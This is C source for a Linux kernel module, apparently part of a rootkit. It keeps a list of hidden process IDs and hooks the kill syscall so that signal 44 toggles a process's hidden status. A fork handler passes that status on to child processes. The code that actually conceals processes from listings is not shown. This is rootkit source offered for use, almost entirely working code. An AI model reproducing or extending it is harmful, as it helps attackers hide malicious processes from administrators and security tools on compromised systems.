#include <linux/module.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/sched/signal.h>


#define SIGHIDE 44 //change it if you like but kill only accepts till 64

struct pid_entry {
	pid_t pid;
	struct list_head list;
};

static LIST_HEAD(hidden_pids);
static DEFINE_MUTEX(pid_lock);

void hide_pid(pid_t pid)
{
	struct pid_entry *e = kmalloc(sizeof(*e), GFP_KERNEL);
	if (!e)
		return;

	e->pid = pid;
	mutex_lock(&pid_lock);
	list_add(&e->list, &hidden_pids);
	mutex_unlock(&pid_lock);
}
void unhide_pid(pid_t pid)
{
	struct pid_entry *e;

	mutex_lock(&pid_lock);
	list_for_each_entry(e, &hidden_pids, list) {
		if (e->pid == pid) {
			list_del(&e->list);
			kfree(e);
			break;
		}
	}
	mutex_unlock(&pid_lock);
}
bool is_hidden_pid(pid_t pid)
{
	struct pid_entry *e;
	bool found = false;

	mutex_lock(&pid_lock);
	list_for_each_entry(e, &hidden_pids, list) {
		if (e->pid == pid) {
			found = true;
			break;
		}
	}
	mutex_unlock(&pid_lock);
	return found;
}

void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
{
	if (is_hidden_pid(parent->pid))
		hide_pid(child->pid);
}

void cleanup_hidden_pids(void)
{
	struct pid_entry *e, *tmp;

	mutex_lock(&pid_lock);
	list_for_each_entry_safe(e, tmp, &hidden_pids, list) {
		list_del(&e->list);
		kfree(e);
	}
	mutex_unlock(&pid_lock);
}
bool does_pid_exist(pid_t pid) {
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return true;
	}
	return false;
}
asmlinkage int (*real_kill)(const struct pt_regs *pt_regs);
asmlinkage int hooked_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	if (sig == SIGHIDE) {
		if (!does_pid_exist(pid))
			return -ESRCH;

		if (is_hidden_pid(pid))
			unhide_pid(pid);
		else
			hide_pid(pid);

		return 0;		
	}
	return real_kill(pt_regs);
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
EXPORT_SYMBOL(hide_pid);
EXPORT_SYMBOL(is_hidden_pid);
EXPORT_SYMBOL(cleanup_hidden_pids);
EXPORT_SYMBOL(on_fork_handler);
EXPORT_SYMBOL(hooked_kill);
EXPORT_SYMBOL(real_kill);
